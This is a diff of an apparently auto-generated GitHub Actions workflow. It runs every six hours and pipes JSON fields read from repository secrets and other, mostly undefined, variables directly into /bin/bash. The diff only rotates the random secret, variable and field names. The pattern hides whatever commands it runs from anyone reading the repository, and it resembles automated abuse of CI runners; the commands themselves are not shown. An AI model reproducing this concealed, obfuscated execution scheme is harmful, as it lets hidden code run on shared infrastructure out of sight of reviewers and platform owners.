@@ -1,9 +1,9 @@
 name: mengtancheng9845
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
-
+    - cron: '43 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,23 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: mengtancheng9845
         env:
-          odf7809: ${{ secrets.odf7809 }}
+          g86210: ${{ secrets.g86210 }}
         run: |
-          echo $odf7809 | jq -r .sv32 | /bin/bash
-          echo $cq9609 | jq -r .uex911 | /bin/bash
-          echo $ettkg96377 | jq -r .wanv402 | /bin/bash
-          echo $uoabs18738 | jq -r .fuep78843 | /bin/bash
-          echo $uc38 | jq -r .ml8 | /bin/bash
-          echo $ixvim38 | jq -r .wxl4 | /bin/bash
-          echo $ju77060 | jq -r .ipyx23391 | /bin/bash
-          echo $ajr386 | jq -r .ygzkb99481 | /bin/bash
-          echo $afh9929 | jq -r .ixe33589 | /bin/bash
-          echo $lhdpi684 | jq -r .zda89 | /bin/bash
-          echo $ifj84161 | jq -r .gz26 | /bin/bash
-          echo $ietvr94863 | jq -r .e35 | /bin/bash
-          echo $xcqe9 | jq -r .f6 | /bin/bash
-          echo $zkqja04 | jq -r .ejuv646 | /bin/bash
-          echo $n4810 | jq -r .w588 | /bin/bash
-          echo $ebxr2 | jq -r .ogesd30543 | /bin/bash
-          echo $gspf75 | jq -r .gnz4 | /bin/bash
+          echo $g86210 | jq -r .a94 | /bin/bash
+          echo $ne7170 | jq -r .afa88 | /bin/bash
+          echo $e3951 | jq -r .vkefs52 | /bin/bash
+          echo $qg73160 | jq -r .mtr41696 | /bin/bash
+          echo $t434 | jq -r .rqqn5087 | /bin/bash
+          echo $lbjbg9012 | jq -r .qdun737 | /bin/bash
+          echo $qr9 | jq -r .gu5 | /bin/bash
+          echo $v3831 | jq -r .wtpsa1 | /bin/bash
+          echo $b584 | jq -r .wiw5 | /bin/bash
+          echo $ap52865 | jq -r .feqoo6 | /bin/bash
+          echo $hzlrl69 | jq -r .fawi1 | /bin/bash
+          echo $pcrfc4148 | jq -r .qa122 | /bin/bash
+          echo $jnpjd362 | jq -r .tld3672 | /bin/bash
 
